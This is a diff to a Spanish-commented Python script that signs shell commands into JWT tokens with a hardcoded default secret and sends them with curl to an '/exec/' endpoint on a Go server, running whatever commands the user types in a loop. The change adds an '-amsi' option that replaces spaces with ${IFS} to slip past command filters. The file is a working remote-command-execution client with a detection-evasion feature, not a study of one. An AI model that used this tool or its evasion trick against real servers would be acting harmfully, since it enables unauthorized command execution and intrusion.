@@ -5,9 +5,13 @@ import sys
 import requests
 import argparse
 
-def generate_token(command, url, port, secret):
+def generate_token(command, url, port, secret, amsi):
     # Utiliza el secreto proporcionado o el valor predeterminado
     secret_key = secret if secret else "PSmu3dR2wMZQvNge"
+
+    # Aplica la sustitución de espacios por ${IFS} si la opción -amsi está activada
+    if amsi:
+        command = command.replace(" ", "${IFS}")
 
     # Crea un token con la estructura "/exec/{cmd}"
     token_payload = {
@@ -28,28 +32,29 @@ def generate_token(command, url, port, secret):
 
     # Usa cURL directamente con el token en el encabezado "Authorization"
     try:
-        # Captura solo la salida del comando, sin la información del proceso
-        response = subprocess.check_output(["curl", "-s", "-H", f"Authorization: Bearer {token}", url_with_token], text=True)
-        print("Respuesta del servidor:")
-        print(response)
+        # Ejecuta el comando en segundo plano y captura el proceso
+        process = subprocess.Popen(["curl", "-s", "-H", f"Authorization: Bearer {token}", url_with_token], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+        # Espera a que el proceso termine y obtiene la salida final
+        final_output, _ = process.communicate()
+
+        # Muestra la salida final
+        print(final_output.decode("utf-8"))
+
     except subprocess.CalledProcessError as e:
         print(f"Error en la solicitud: {e}")
 
 if __name__ == "__main__":
     # Configura el parser de argumentos
     parser = argparse.ArgumentParser(description="Generador de token y ejecución de comandos en servidor Go.")
-    parser.add_argument("command", help="Comando a ejecutar")
     parser.add_argument("--url", help="URL del servidor Go")
     parser.add_argument("--port", help="Puerto del servidor Go")
     parser.add_argument("--secret", help="Clave secreta para firmar el token (opcional)")
-
-    # Parsea los argumentos de la línea de comandos
-    args = parser.parse_args()
+    parser.add_argument("-amsi", type=int, choices=[0, 1], default=0, help="Activar sustitución de espacios por ${IFS} (0: Desactivado, 1: Activado)")
 
     # Mensaje de ayuda para explicar el propósito y el uso del script
     print("Este script genera un token JWT con un comando y lo envía a un servidor Go para su ejecución.")
-    print("Puedes proporcionar un comando directamente o ingresar 'exit' para salir.")
-    print("Ejemplo: python script.py --url 192.168.1.100 --port 8080 --secret MySecretKey ls -la")
+    print("Puedes ingresar 'exit' para salir en cualquier momento.")
 
     # Bucle para ingresar comandos hasta que se ingrese 'exit'
     while True:
@@ -59,5 +64,4 @@ if __name__ == "__main__":
             break
 
         # Utiliza la URL, el puerto y el secreto proporcionados como argumentos, si están presentes
-        generate_token(user_input, args.url, args.port, args.secret)
-
+        generate_token(user_input, parser.parse_args().url, parser.parse_args().port, parser.parse_args().secret, parser.parse_args().amsi)
